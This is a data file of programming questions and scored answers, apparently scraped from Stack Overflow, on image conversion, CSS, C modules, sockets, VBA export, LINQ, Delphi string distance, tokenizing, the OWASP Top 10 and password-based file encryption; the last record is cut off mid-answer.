{"title": "How do I resize and convert an uploaded image to a PNG using GD?", "description": "I want to allow users to upload avatar-type images in a variety of formats (GIF, JPEG, and PNG at least), but to save them all as PNG database BLOBs. If the images are oversized, pixelwise, I want to resize them before DB-insertion.\nWhat is the best way to use GD to do the resizing and PNG conversion?\nEdit: Sadly, only GD is available on the server I need to use, no  ImageMagick.\n", "answer": "<?php                                              \n/*\nResizes an image and converts it to PNG returning the PNG data as a string\n*/\nfunction imageToPng($srcFile, $maxSize = 100) {  \n    list($width_orig, $height_orig, $type) = getimagesize($srcFile);        \n\n    // Get the aspect ratio\n    $ratio_orig = $width_orig / $height_orig;\n\n    $width  = $maxSize; \n    $height = $maxSize;\n\n    // resize to height (orig is portrait) \n    if ($ratio_orig < 1) {\n        $width = $height * $ratio_orig;\n    } \n    // resize to width (orig is landscape)\n    else {\n        $height = $width / $ratio_orig;\n    }\n\n    // Temporarily increase the memory limit to allow for larger images\n    ini_set('memory_limit', '32M'); \n\n    switch ($type) \n    {\n        case IMAGETYPE_GIF: \n            $image = imagecreatefromgif($srcFile); \n            break;   \n        case IMAGETYPE_JPEG:  \n            $image = imagecreatefromjpeg($srcFile); \n            break;   \n        case IMAGETYPE_PNG:  \n            $image = imagecreatefrompng($srcFile);\n            break; \n        default:\n            throw new Exception('Unrecognized image type ' . $type);\n    }\n\n    // create a new blank image\n    $newImage = imagecreatetruecolor($width, $height);\n\n    // Copy the old image to the new image\n    imagecopyresampled($newImage, $image, 0, 0, 0, 0, $width, $height, $width_orig, $height_orig);\n\n    // Output to a temp file\n    $destFile = tempnam();\n    imagepng($newImage, $destFile);  \n\n    // Free memory                           \n    imagedestroy($newImage);\n\n    if ( is_file($destFile) ) {\n        $f = fopen($destFile, 'rb');   \n        $data = fread($f);       \n        fclose($f);\n\n        // Remove the tempfile\n        unlink($destFile);    \n        return $data;\n    }\n\n    throw new Exception('Image conversion failed.');\n}\n\n", "score": 24}
{"title": "How do I style (css) radio buttons and labels?", "description": "Given the code bellow, how do I style the radio buttons to be next to the labels and style the label of the selected radio button differently than the other labels?\n\n<link href=\"http://yui.yahooapis.com/2.5.2/build/reset-fonts-grids/reset-fonts-grids.css\" rel=\"stylesheet\">\r\n<link href=\"http://yui.yahooapis.com/2.5.2/build/base/base-min.css\" rel=\"stylesheet\">\r\n\r\n<div class=\"input radio\">\r\n  <fieldset>\r\n    <legend>What color is the sky?</legend>\r\n    <input type=\"hidden\" name=\"color\" value=\"\" id=\"SubmitQuestion\" />\r\n    <input type=\"radio\" name=\"color\" id=\"SubmitQuestion1\" value=\"1\"  />\r\n    <label for=\"SubmitQuestion1\">A strange radient green.</label>\r\n    <input type=\"radio\" name=\"color\" id=\"SubmitQuestion2\" value=\"2\"  />\r\n    <label for=\"SubmitQuestion2\">A dark gloomy orange</label>\r\n    <input type=\"radio\" name=\"color\" id=\"SubmitQuestion3\" value=\"3\"  />\r\n    <label for=\"SubmitQuestion3\">A perfect glittering blue</label>\r\n  </fieldset>\r\n</div>\n\nAlso let me state that I use the yui css styles as base. If you are not familir with them, they can be found here:\n\nreset-fonts-grids.css\nbase-min.css\n\nDocumentation for them both here : Yahoo! UI Library\n@pkaeding: Thanks. I tried some floating both thing that just looked messed up. The styling active radio button seemed to be doable with some input[type=radio]:active nomination on a google search, but I didnt get it to work properly. So the question I guess is more: Is this possible on all of todays modern browsers, and if not, what is the minimal JS needed?\n", "answer": "The first part of your question can be solved with just HTML & CSS; you'll need to use Javascript for the second part.\nGetting the Label Near the Radio Button\nI'm not sure what you mean by \"next to\": on the same line and near, or on separate lines? If you want all of the radio buttons on the same line, just use margins to push them apart. If you want each of them on their own line, you have two options (unless you want to venture into float: territory):\n\nUse <br />s  to split the options apart and some CSS to vertically align them:\n\n<style type='text/css'>\n    .input input\n    {\n        width: 20px;\n    }\n</style>\n<div class=\"input radio\">\n    <fieldset>\n        <legend>What color is the sky?</legend>\n        <input type=\"hidden\" name=\"data[Submit][question]\" value=\"\" id=\"SubmitQuestion\" />\n\n        <input type=\"radio\" name=\"data[Submit][question]\" id=\"SubmitQuestion1\" value=\"1\"  />\n        <label for=\"SubmitQuestion1\">A strange radient green.</label>\n        <br />\n        <input type=\"radio\" name=\"data[Submit][question]\" id=\"SubmitQuestion2\" value=\"2\"  />\n        <label for=\"SubmitQuestion2\">A dark gloomy orange</label>\n        <br />\n        <input type=\"radio\" name=\"data[Submit][question]\" id=\"SubmitQuestion3\" value=\"3\"  />\n        <label for=\"SubmitQuestion3\">A perfect glittering blue</label>\n    </fieldset>\n</div>\n\nFollow A List Apart's article: Prettier Accessible Forms\n\nApplying a Style to the Currently Selected Label + Radio Button\nStyling the <label> is why you'll need to resort to Javascript. A library like jQuery\nis perfect for this:\n<style type='text/css'>\n    .input label.focused\n    {\n        background-color: #EEEEEE;\n        font-style: italic;\n    }\n</style>\n<script type='text/javascript' src='jquery.js'></script>\n<script type='text/javascript'>\n    $(document).ready(function() {\n        $('.input :radio').focus(updateSelectedStyle);\n        $('.input :radio').blur(updateSelectedStyle);\n        $('.input :radio').change(updateSelectedStyle);\n    })\n\n    function updateSelectedStyle() {\n        $('.input :radio').removeClass('focused').next().removeClass('focused');\n        $('.input :radio:checked').addClass('focused').next().addClass('focused');\n    }\n</script>\n\nThe focus and blur hooks are needed to make this work in IE.\n", "score": 33}
{"title": "Tips for database design in a web application", "description": "Does someone have any tips/advice on database design for a web application? The kind of stuff that can save me a lot of time/effort in the future when/if the application I'm working on takes off and starts having a lot of usage.\nTo be a bit more specific, the application is a strategy game (browser based, just text) that will mostly involve players issuing \"orders\" that will be stored in the database and processed later, with the results also being stored there (the history of \"orders\" and the corresponding results will probably get quite big).\nEdited to add more details (as requested):\nplatform: Django\ndatabase engine: I was thinking of using MySQL (unless there's a big advantage in using another)\nthe schema: all I have now are some Django models, and that's far too much detail to post here. And if I start posting schemas this becomes too specific, and I was looking for general tips. For example, consider that I issue \"orders\" that will be later processed and return a result that I have to store to display some kind of \"history\". In this case is it better to have a separate table for the \"history\" or just one that aggregates both the \"orders\" and the result? I guess I could cache the \"history\" table, but this would take more space in the database and also more database operations because I would have to constantly create new rows instead of just altering them in the aggregate table.\n", "answer": "You have probably touched on a much larger issue of designing for high scalability and performance in general.\nEssentially, for your database design I would follow good practices such as adding foreign keys and indexes to data you expect to be used frequently, normalise your data by splitting it into smaller tables and identify which data is to be read frequently and which is to be written frequently and optimise.\nMuch more important than your database design for high performance web applications, is your effective use of caching both at the client level through HTML page caching and at the server level through cached data or serving up static files in place of dynamic files.\nThe great thing about caching is that it can be added as it is needed, so that when your application does take off then you evolve accordingly.\nAs far as your historical data is concerned, this is a great thing to cache as you do not expect it to change frequently.  If you wish to produce regular and fairly intensive reports from your data, then it is good practise to put this data into another database so as not to bring your web application to a halt whilst they run.\nOf course this kind of optimisation really isn't necessary unless you think your application will warrant it.\n", "score": 10}
{"title": "What's the best approach to naming classes?", "description": "Coming up with good, precise names for classes is notoriously difficult. Done right, it makes code more self-documenting and provides a vocabulary for reasoning about code at a higher level of abstraction. \nClasses which implement a particular design pattern might be given a name based on the well known pattern name (e.g. FooFactory, FooFacade), and classes which directly model domain concepts can take their names from the problem domain, but what about other classes? Is there anything like a programmer's thesaurus that I can turn to when I'm lacking inspiration, and want to avoid using generic class names (like FooHandler, FooProcessor, FooUtils, and FooManager)?\n", "answer": "I'll cite some passages from Implementation Patterns by Kent Beck:\nSimple Superclass Name\n\n\"[...] The names should be short and punchy.\nHowever, to make the names precise\nsometimes seems to require several\nwords. A way out of this dilemma is\npicking a strong metaphor for the\ncomputation. With a metaphor in mind,\neven single words bring with them a\nrich web of associations, connections,\nand implications. For example, in the\nHotDraw drawing framework, my first\nname for an object in a drawing was\nDrawingObject. Ward Cunningham came\nalong with the typography metaphor: a\ndrawing is like a printed, laid-out\npage. Graphical items on a page are\nfigures, so the class became Figure.\nIn the context of the metaphor, Figure\nis simultaneously shorter, richer, and\nmore precise than DrawingObject.\"\n\nQualified Subclass Name\n\n\"The names of subclasses have two jobs.\nThey need to communicate what class\nthey are like and how they are\ndifferent. [...] Unlike the names at\nthe roots of hierarchies, subclass\nnames aren’t used nearly as often in\nconversation, so they can be\nexpressive at the cost of being\nconcise. [...]\nGive subclasses that serve as the\nroots of hierarchies their own simple\nnames. For example, HotDraw has a\nclass Handle which presents figure-\nediting operations when a figure is\nselected. It is called, simply, Handle\nin spite of extending Figure. There is\na whole family of handles and they\nmost appropriately have names like\nStretchyHandle and TransparencyHandle.\nBecause Handle is the root of its own\nhierarchy, it deserves a simple\nsuperclass name more than a qualified\nsubclass name.\nAnother wrinkle in\nsubclass naming is multiple-level\nhierarchies. [...] Rather than blindly\nprepend the modifiers to the immediate\nsuperclass, think about the name from\nthe reader’s perspective. What class\ndoes he need to know this class is\nlike? Use that superclass as the basis\nfor the subclass name.\"\n\nInterface\n\nTwo styles of naming interfaces depend on how you are thinking of the interfaces.\nInterfaces as classes without implementations should be named as if they were classes\n(Simple Superclass Name, Qualified Subclass Name). One problem with this style of\nnaming is that the good names are used up before you get to naming classes. An\ninterface called File needs an implementation class called something like\nActualFile, ConcreteFile, or (yuck!) FileImpl (both a suffix and an\nabbreviation). In general, communicating whether one is dealing with a concrete or\nabstract object is important, whether the abstract object is implemented as an\ninterface or a superclass is less important. Deferring the distinction between\ninterfaces and superclasses is well >supported by this style of naming, leaving you\nfree to change your mind later if that >becomes necessary.\nSometimes, naming concrete classes simply is more important to communication than\nhiding the use of interfaces. In this case, prefix interface names with “I”. If the\ninterface is called IFile, the class can be simply called File.\n\nFor more detailed discussion, buy the book! It's worth it! :)\n", "score": 67}
{"title": "Organization of C files", "description": "I'm used to doing all my coding in one C file. However, I'm working on a project large enough that it becomes impractical to do so. I've been #including them together but I've run into cases where I'm #including some files multiple times, etc. I've heard of .h files, but I'm not sure what their function is (or why having 2 files is better than 1).\nWhat strategies should I use for organizing my code? Is it possible to separate \"public\" functions from \"private\" ones for a particular file?\nThis question precipitated my inquiry. The tea.h file makes no reference to the tea.c file. Does the compiler \"know\" that every .h file has a corresponding .c file?\n", "answer": "You should regard .h files as interface files of your .c file. Every .c file represents a module with a certain amount of functionality. If functions in a .c file are used by other modules (i.e. other .c files) put the function prototype in the .h interface file. By including the interface file in your original modules .c file and every other .c file you  need the function in, you make this function available to other modules. \nIf you only need a function in a certain .c file (not in any other module), declare its scope static. This means it can only be called from within the c file it is defined in. \nSame goes for variables that are used across multiple modules. They should go in the header file and there they have to marked with the keyword 'extern'. Note: For functions the keyword 'extern' is optional. Functions are always considered 'extern'.\nThe inclusion guards in header files help to not include the same header file multiple times.\nFor example:\nModule1.c:\n\n    #include \"Module1.h\"\n\n    static void MyLocalFunction(void);\n    static unsigned int MyLocalVariable;    \n    unsigned int MyExternVariable;\n\n    void MyExternFunction(void)\n    {\n        MyLocalVariable = 1u;       \n\n        /* Do something */\n\n        MyLocalFunction();\n    }\n\n    static void MyLocalFunction(void)\n    {\n      /* Do something */\n\n      MyExternVariable = 2u;\n    }\n\nModule1.h:\n\n    #ifndef __MODULE1.H\n    #define __MODULE1.H\n\n    extern unsigned int MyExternVariable;\n\n    void MyExternFunction(void);      \n\n    #endif\n\nModule2.c\n\n    #include \"Module.1.h\"\n\n    static void MyLocalFunction(void);\n\n    static void MyLocalFunction(void)\n    {\n      MyExternVariable = 1u;\n      MyExternFunction();\n    }\n\n", "score": 38}
{"title": "How Do Sockets Work in C?", "description": "I am a bit confused about socket programming in C.\nYou create a socket, bind it to an interface and an IP address and get it to listen. I found a couple of web resources on that, and understood it fine. In particular, I found an article Network programming under Unix systems to be very informative.\nWhat confuses me is the timing of data arriving on the socket.\nHow can you tell when packets arrive, and how big the packet is, do you have to do all the heavy lifting yourself? \nMy basic assumption here is that packets can be of variable length, so once binary data starts appearing down the socket, how do you begin to construct packets from that?\n", "answer": "Short answer is that you have to do all the heavy lifting yourself.  You can be notified that there is data available to be read, but you won't know how many bytes are available.  In most IP protocols that use variable length packets, there will be a header with a known fixed length prepended to the packet.  This header will contain the length of the packet.  You read the header, get the length of the packet, then read the packet.  You repeat this pattern (read header, then read packet) until communication is complete.\nWhen reading data from a socket, you request a certain number of bytes.  The read call may block until the requested number of bytes are read, but it can return fewer bytes than what was requested.  When this happens, you simply retry the read, requesting the remaining bytes.\nHere's a typical C function for reading a set number of bytes from a socket:\n/* buffer points to memory block that is bigger than the number of bytes to be read */\n/* socket is open socket that is connected to a sender */\n/* bytesToRead is the number of bytes expected from the sender */\n/* bytesRead is a pointer to a integer variable that will hold the number of bytes */\n/*           actually received from the sender. */\n/* The function returns either the number of bytes read, */\n/*                             0 if the socket was closed by the sender, and */\n/*                            -1 if an error occurred while reading from the socket */\nint readBytes(int socket, char *buffer, int bytesToRead, int *bytesRead)\n{\n    *bytesRead = 0;\n    while(*bytesRead < bytesToRead)\n    {\n        int ret = read(socket, buffer + *bytesRead, bytesToRead - *bytesRead);\n        if(ret <= 0)\n        {\n           /* either connection was closed or an error occurred */\n           return ret;\n        }\n        else\n        {\n           *bytesRead += ret;\n        }\n    }\n    return *bytesRead;\n}\n\n", "score": 17}
{"title": "Programmatically extract macro (VBA) code from Word 2007 docs", "description": "Is it possible to extract all of the VBA code from a Word 2007 \"docm\" document using the API?\nI have found how to insert VBA code at runtime, and how to delete all VBA code, but not pull the actual code out into a stream or string that I can store (and insert into other documents in the future).\nAny tips or resources would be appreciated.\nEdit: thanks to everyone, Aardvark's answer was exactly what I was looking for.  I have converted his code to C#, and was able to call it from a class library using Visual Studio 2008.\nusing Microsoft.Office.Interop.Word;\nusing Microsoft.Vbe.Interop;\n\n...\n\npublic List<string> GetMacrosFromDoc()\n{\n    Document doc = GetWordDoc(@\"C:\\Temp\\test.docm\");\n\n    List<string> macros = new List<string>();\n\n    VBProject prj;\n    CodeModule code;\n    string composedFile;\n\n    prj = doc.VBProject;\n    foreach (VBComponent comp in prj.VBComponents)\n    {\n        code = comp.CodeModule;\n\n        // Put the name of the code module at the top\n        composedFile = comp.Name + Environment.NewLine;\n\n        // Loop through the (1-indexed) lines\n        for (int i = 0; i < code.CountOfLines; i++)\n        {\n            composedFile += code.get_Lines(i + 1, 1) + Environment.NewLine;\n        }\n\n        // Add the macro to the list\n        macros.Add(composedFile);\n    }\n\n    CloseDoc(doc);\n\n    return macros;\n}\n\n", "answer": "You could export the code to files and then read them back in.\nI've been using the code below to help me keep some Excel macros under source control (using Subversion & TortoiseSVN).  It basically exports all the code to text files any time I save with the VBA editor open.  I put the text files in subversion so that I can do diffs.  You should be able to adapt/steal some of this to work in Word.\nThe registry check in CanAccessVBOM() corresponds to the \"Trust access to Visual Basic Project\" in the security setting.\nSub ExportCode()\n\n    If Not CanAccessVBOM Then Exit Sub ' Exit if access to VB object model is not allowed\n    If (ThisWorkbook.VBProject.VBE.ActiveWindow Is Nothing) Then\n        Exit Sub ' Exit if VBA window is not open\n    End If\n    Dim comp As VBComponent\n    Dim codeFolder As String\n\n    codeFolder = CombinePaths(GetWorkbookPath, \"Code\")\n    On Error Resume Next\n    MkDir codeFolder\n    On Error GoTo 0\n    Dim FileName As String\n\n    For Each comp In ThisWorkbook.VBProject.VBComponents\n        Select Case comp.Type\n            Case vbext_ct_ClassModule\n                FileName = CombinePaths(codeFolder, comp.Name & \".cls\")\n                DeleteFile FileName\n                comp.Export FileName\n            Case vbext_ct_StdModule\n                FileName = CombinePaths(codeFolder, comp.Name & \".bas\")\n                DeleteFile FileName\n                comp.Export FileName\n            Case vbext_ct_MSForm\n                FileName = CombinePaths(codeFolder, comp.Name & \".frm\")\n                DeleteFile FileName\n                comp.Export FileName\n            Case vbext_ct_Document\n                FileName = CombinePaths(codeFolder, comp.Name & \".cls\")\n                DeleteFile FileName\n                comp.Export FileName\n        End Select\n    Next\n\nEnd Sub\nFunction CanAccessVBOM() As Boolean\n    ' Check resgistry to see if we can access the VB object model\n    Dim wsh As Object\n    Dim str1 As String\n    Dim AccessVBOM As Long\n\n    Set wsh = CreateObject(\"WScript.Shell\")\n    str1 = \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\" & _\n        Application.Version & \"\\Excel\\Security\\AccessVBOM\"\n    On Error Resume Next\n    AccessVBOM = wsh.RegRead(str1)\n    Set wsh = Nothing\n    CanAccessVBOM = (AccessVBOM = 1)\nEnd Function\n\nSub DeleteFile(FileName As String)\n    On Error Resume Next\n    Kill FileName\nEnd Sub\n\nFunction GetWorkbookPath() As String\n    Dim fullName As String\n    Dim wrkbookName As String\n    Dim pos As Long\n\n    wrkbookName = ThisWorkbook.Name\n    fullName = ThisWorkbook.fullName\n\n    pos = InStr(1, fullName, wrkbookName, vbTextCompare)\n\n    GetWorkbookPath = Left$(fullName, pos - 1)\nEnd Function\n\nFunction CombinePaths(ByVal Path1 As String, ByVal Path2 As String) As String\n    If Not EndsWith(Path1, \"\\\") Then\n        Path1 = Path1 & \"\\\"\n    End If\n    CombinePaths = Path1 & Path2\nEnd Function\n\nFunction EndsWith(ByVal InString As String, ByVal TestString As String) As Boolean\n    EndsWith = (Right$(InString, Len(TestString)) = TestString)\nEnd Function\n\n", "score": 29}
{"title": "How do I compose existing Linq Expressions", "description": "I want to compose the results of two Linq Expressions. They exist in the form\nExpression<Func<T, bool>>\n\nSo the two that I want to compose are essentially delegates on a parameter (of type T) that both return a boolean. The result I would like composed would be the logical evaluation of the booleans. I would probably implement it as an extension method so my syntax would be something like:\nExpression<Func<User, bool>> expression1 = t => t.Name == \"steve\";\nExpression<Func<User, bool>> expression2 = t => t.Age == 28;\nExpression<Func<User, bool>> composedExpression = expression1.And(expression2);\n\nAnd later on in my code I want to evaluate the composed expression\nvar user = new User();\nbool evaluated = composedExpression.Compile().Invoke(user);\n\nI have poked around with a few different ideas but I fear that it is more complex than I had hoped. How is this done?\n", "answer": "Here is an example:\nvar user1 = new User {Name = \"steve\", Age = 28};\nvar user2 = new User {Name = \"foobar\", Age = 28};\n\nExpression<Func<User, bool>> expression1 = t => t.Name == \"steve\";\nExpression<Func<User, bool>> expression2 = t => t.Age == 28;\n\nvar invokedExpression = Expression.Invoke(expression2, expression1.Parameters.Cast<Expression>());\n\nvar result = Expression.Lambda<Func<User, bool>>(Expression.And(expression1.Body, invokedExpression), expression1.Parameters);\n\nConsole.WriteLine(result.Compile().Invoke(user1)); // true\nConsole.WriteLine(result.Compile().Invoke(user2)); // false\n\nYou can reuse this code via extension methods:  \nclass User\n{\n  public string Name { get; set; }\n  public int Age { get; set; }\n}\n\npublic static class PredicateExtensions\n{\n  public static Expression<Func<T, bool>> And<T>(this Expression<Func<T, bool>> expression1,Expression<Func<T, bool>> expression2)\n  {\n    InvocationExpression invokedExpression = Expression.Invoke(expression2, expression1.Parameters.Cast<Expression>());\n\n    return Expression.Lambda<Func<T, bool>>(Expression.And(expression1.Body, invokedExpression), expression1.Parameters);\n  }\n}\n\nclass Program\n{\n  static void Main(string[] args)\n  {\n    var user1 = new User {Name = \"steve\", Age = 28};\n    var user2 = new User {Name = \"foobar\", Age = 28};\n\n    Expression<Func<User, bool>> expression1 = t => t.Name == \"steve\";\n    Expression<Func<User, bool>> expression2 = t => t.Age == 28;\n\n    var result = expression1.And(expression2);\n\n    Console.WriteLine(result.Compile().Invoke(user1));\n    Console.WriteLine(result.Compile().Invoke(user2));\n  }\n}\n\n", "score": 20}
{"title": "Get the App.Config of another Exe", "description": "I have an exe with an App.Config file. Now I want to create a wrapper dll around the exe in order to consume some of the functionalities.\nThe question is how can I access the app.config property in the exe from the wrapper dll?\nMaybe I should be a little bit more in my questions, I have the following app.config content with the exe:\n<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n<configuration>\n  <appSettings>\n    <add key=\"myKey\" value=\"myValue\"/>\n  </appSettings>\n</configuration>\n\nThe question is how to how to get \"myValue\" out from the wrapper dll?\n\nthanks for your solution.\nActually my initial concept was to avoid XML file reading method or LINQ or whatever. My preferred solution was to use the configuration manager libraries and the like.\nI'll appreciate any help that uses the classes that are normally associated with accessing app.config properties. \n", "answer": "The ConfigurationManager.OpenMappedExeConfiguration Method will allow you to do this.\nSample from the MSDN page:\nstatic void GetMappedExeConfigurationSections()\n{\n    // Get the machine.config file.\n    ExeConfigurationFileMap fileMap =\n        new ExeConfigurationFileMap();\n    // You may want to map to your own exe.comfig file here.\n    fileMap.ExeConfigFilename = \n        @\"C:\\test\\ConfigurationManager.exe.config\";\n    System.Configuration.Configuration config =\n        ConfigurationManager.OpenMappedExeConfiguration(fileMap, \n        ConfigurationUserLevel.None);\n\n    // Loop to get the sections. Display basic information.\n    Console.WriteLine(\"Name, Allow Definition\");\n    int i = 0;\n    foreach (ConfigurationSection section in config.Sections)\n    {\n        Console.WriteLine(\n            section.SectionInformation.Name + \"\\t\" +\n        section.SectionInformation.AllowExeDefinition);\n        i += 1;\n\n    }\n    Console.WriteLine(\"[Total number of sections: {0}]\", i);\n\n    // Display machine.config path.\n    Console.WriteLine(\"[File path: {0}]\", config.FilePath);\n}\n\nEDIT: This should output the \"myKey\" value:\nExeConfigurationFileMap fileMap =\n    new ExeConfigurationFileMap();\nfileMap.ExeConfigFilename = \n    @\"C:\\test\\ConfigurationManager.exe.config\";\nSystem.Configuration.Configuration config =\n    ConfigurationManager.OpenMappedExeConfiguration(fileMap, \n    ConfigurationUserLevel.None);\nConsole.WriteLine(config.AppSettings.Settings[\"MyKey\"].Value);\n\n", "score": 24}
{"title": "How do you implement Levenshtein distance in Delphi?", "description": "I'm posting this in the spirit of answering your own questions.\nThe question I had was: How can I implement the Levenshtein algorithm for calculating edit-distance between two strings, as described here, in Delphi?\nJust a note on performance:\nThis thing is very fast.  On my desktop (2.33 Ghz dual-core, 2GB ram, WinXP), I can run through an array of 100K strings in less than one second.\n", "answer": "function EditDistance(s, t: string): integer;\nvar\n  d : array of array of integer;\n  i,j,cost : integer;\nbegin\n  {\n  Compute the edit-distance between two strings.\n  Algorithm and description may be found at either of these two links:\n  http://en.wikipedia.org/wiki/Levenshtein_distance\n  http://www.google.com/search?q=Levenshtein+distance\n  }\n\n  //initialize our cost array\n  SetLength(d,Length(s)+1);\n  for i := Low(d) to High(d) do begin\n    SetLength(d[i],Length(t)+1);\n  end;\n\n  for i := Low(d) to High(d) do begin\n    d[i,0] := i;\n    for j := Low(d[i]) to High(d[i]) do begin\n      d[0,j] := j;\n    end;\n  end;\n\n  //store our costs in a 2-d grid  \n  for i := Low(d)+1 to High(d) do begin\n    for j := Low(d[i])+1 to High(d[i]) do begin\n      if s[i] = t[j] then begin\n        cost := 0;\n      end\n      else begin\n        cost := 1;\n      end;\n\n      //to use \"Min\", add \"Math\" to your uses clause!\n      d[i,j] := Min(Min(\n                 d[i-1,j]+1,      //deletion\n                 d[i,j-1]+1),     //insertion\n                 d[i-1,j-1]+cost  //substitution\n                 );\n    end;  //for j\n  end;  //for i\n\n  //now that we've stored the costs, return the final one\n  Result := d[Length(s),Length(t)];\n\n  //dynamic arrays are reference counted.\n  //no need to deallocate them\nend;\n\n", "score": 18}
{"title": "Best way to parse Space Separated Text", "description": "I have string like this\n /c SomeText\\MoreText \"Some Text\\More Text\\Lol\" SomeText\n\nI want to tokenize it, however I can't just split on the spaces. I've come up with somewhat ugly parser that works, but I'm wondering if anyone has a more elegant design.\nThis is in C# btw.\nEDIT: My ugly version, while ugly, is O(N) and may actually be faster than using a RegEx.\nprivate string[] tokenize(string input)\n{\n    string[] tokens = input.Split(' ');\n    List<String> output = new List<String>();\n\n    for (int i = 0; i < tokens.Length; i++)\n    {\n        if (tokens[i].StartsWith(\"\\\"\"))\n        {\n            string temp = tokens[i];\n            int k = 0;\n            for (k = i + 1; k < tokens.Length; k++)\n            {\n                if (tokens[k].EndsWith(\"\\\"\"))\n                {\n                    temp += \" \" + tokens[k];\n                    break;\n                }\n                else\n                {\n                    temp += \" \" + tokens[k];\n                }\n            }\n            output.Add(temp);\n            i = k + 1;\n        }\n        else\n        {\n            output.Add(tokens[i]);\n        }\n    }\n\n    return output.ToArray();            \n}\n\n", "answer": "The computer term for what you're doing is lexical analysis; read that for a good summary of this common task.\nBased on your example, I'm guessing that you want whitespace to separate your words, but stuff in quotation marks should be treated as a \"word\" without the quotes.\nThe simplest way to do this is to define a word as a regular expression:\n([^\"^\\s]+)\\s*|\"([^\"]+)\"\\s*\n\nThis expression states that a \"word\" is either (1) non-quote, non-whitespace text surrounded by whitespace, or (2) non-quote text surrounded by quotes (followed by some whitespace). Note the use of capturing parentheses to highlight the desired text.\nArmed with that regex, your algorithm is simple: search your text for the next \"word\" as defined by the capturing parentheses, and return it. Repeat that until you run out of \"words\".\nHere's the simplest bit of working code I could come up with, in VB.NET. Note that we have to check both groups for data since there are two sets of capturing parentheses.\nDim token As String\nDim r As Regex = New Regex(\"([^\"\"^\\s]+)\\s*|\"\"([^\"\"]+)\"\"\\s*\")\nDim m As Match = r.Match(\"this is a \"\"test string\"\"\")\n\nWhile m.Success\n    token = m.Groups(1).ToString\n    If token.length = 0 And m.Groups.Count > 1 Then\n        token = m.Groups(2).ToString\n    End If\n    m = m.NextMatch\nEnd While\n\nNote 1: Will's answer, above, is the same idea as this one. Hopefully this answer explains the details behind the scene a little better :)\n", "score": 16}
{"title": "What common web exploits should I know about?", "description": "I'm pretty green still when it comes to web programming, I've spent most of my time on client applications.  So I'm curious about the common exploits I should fear/test for in my site.\n", "answer": "I'm posting the OWASP Top 2007 abbreviated list here so people don't have to look through to another link and in case the source goes down.\nCross Site Scripting (XSS)\n\nXSS flaws occur whenever an application takes user supplied data and sends it to a web browser without first validating or encoding that content. XSS allows attackers to execute script in the victim's browser which can hijack user sessions, deface web sites, possibly introduce worms, etc.\n\nInjection Flaws\n\nInjection flaws, particularly SQL injection, are common in web applications. Injection occurs when user-supplied data is sent to an interpreter as part of a command or query. The attacker's hostile data tricks the interpreter into executing unintended commands or changing data.\n\nMalicious File Execution\n\nCode vulnerable to remote file inclusion (RFI) allows attackers to include hostile code and data, resulting in devastating attacks, such as total server compromise. Malicious file execution attacks affect PHP, XML and any framework which accepts filenames or files from users.\n\nInsecure Direct Object Reference\n\nA direct object reference occurs when a developer exposes a reference to an internal implementation object, such as a file, directory, database record, or key, as a URL or form parameter. Attackers can manipulate those references to access other objects without authorization.\n\nCross Site Request Forgery (CSRF)\n\nA CSRF attack forces a logged-on victim's browser to send a pre-authenticated request to a vulnerable web application, which then forces the victim's browser to perform a hostile action to the benefit of the attacker. CSRF can be as powerful as the web application that it attacks.\n\nInformation Leakage and Improper Error Handling\n\nApplications can unintentionally leak information about their configuration, internal workings, or violate privacy through a variety of application problems. Attackers use this weakness to steal sensitive data, or conduct more serious attacks.\n\nBroken Authentication and Session Management\n\nAccount credentials and session tokens are often not properly protected. Attackers compromise passwords, keys, or authentication tokens to assume other users' identities.\n\nInsecure Cryptographic Storage\n\nWeb applications rarely use cryptographic functions properly to protect data and credentials. Attackers use weakly protected data to conduct identity theft and other crimes, such as credit card fraud.\n\nInsecure Communications\n\nApplications frequently fail to encrypt network traffic when it is necessary to protect sensitive communications.\n\nFailure to Restrict URL Access\n\nFrequently, an application only protects sensitive functionality by preventing the display of links or URLs to unauthorized users. Attackers can use this weakness to access and perform unauthorized operations by accessing those URLs directly.\n\nThe Open Web Application Security Project\n-Adam\n", "score": 35}
{"title": "How to implement password protection for individual files?", "description": "I'm writing a little desktop app that should be able to encrypt a data file and protect it with a password (i.e. one must enter the correct password to decrypt).  I want the encrypted data file to be self-contained and portable, so the authentication has to be embedded in the file (or so I assume).\nI have a strategy that appears workable and seems logical based on what I know (which is probably just enough to be dangerous), but I have no idea if it's actually a good design or not.  So tell me: is this crazy?  Is there a better/best way to do it?\n\nStep 1: User enters plain-text password, e.g. \"MyDifficultPassword\"  \nStep 2: App hashes the user-password and uses that value as the symmetric key to encrypt/decrypt the data file.  e.g. \"MyDifficultPassword\" --> \"HashedUserPwdAndKey\".  \nStep 3: App hashes the hashed value from step 2 and saves the new value in the data file header (i.e. the unencrypted part of the data file) and uses that value to validate the user's password.  e.g. \"HashedUserPwdAndKey\" --> \"HashedValueForAuthentication\"\n\nBasically I'm extrapolating from the common way to implement web-site passwords (when you're not using OpenID, that is), which is to store the (salted) hash of the user's password in your DB and never save the actual password.  But since I use the hashed user password for the symmetric encryption key, I can't use the same value for authentication.  So I hash it again, basically treating it just like another password, and save the doubly-hashed value in the data file.  That way, I can take the file to another PC and decrypt it by simply entering my password.\nSo is this design reasonably secure, or hopelessly naive, or somewhere in between?  Thanks!\nEDIT: clarification and follow-up question re: Salt.\nI thought the salt had to be kept secret to be useful, but your answers and links imply this is not the case.  For example, this spec linked by erickson (below) says: \n\nThus, password-based key derivation as defined here is a function of a password, a salt, and an iteration count, where the latter two quantities need not be kept secret.\n\nDoes this mean that I could store the salt value in the same place/file as the hashed key and still be more secure than if I used no salt at all when hashing?  How does that work?\nA little more context: the encrypted file isn't meant to be shared with or decrypted by others, it's really single-user data.  But I'd like to deploy it in a shared environment on computers I don't fully control (e.g. at work) and be able to migrate/move the data by simply copying the file (so I can use it at home, on different workstations, etc.).\n", "answer": "Key Generation\nI would recommend using a recognized algorithm such as PBKDF2 defined in PKCS #5 version 2.0 to generate a key from your password. It's similar to the algorithm you outline, but is capable of generating longer symmetric keys for use with AES. You should be able to find an open-source library that implements PBE key generators for different algorithms.\nFile Format\nYou might also consider using the Cryptographic Message Syntax as a format for your file. This will require some study on your part, but again there are existing libraries to use, and it opens up the possibility of inter-operating more smoothly with other software, like S/MIME-enabled mail clients.\nPassword Validation\nRegarding your desire to store a hash of the password, if you use PBKDF2 to generate the key, you could use a standard password hashing algorithm (big salt, a thousand rounds of hashing) for that, and get different values. \nAlternatively, you could compute a MAC on the content. A hash collision on a password is more likely to be 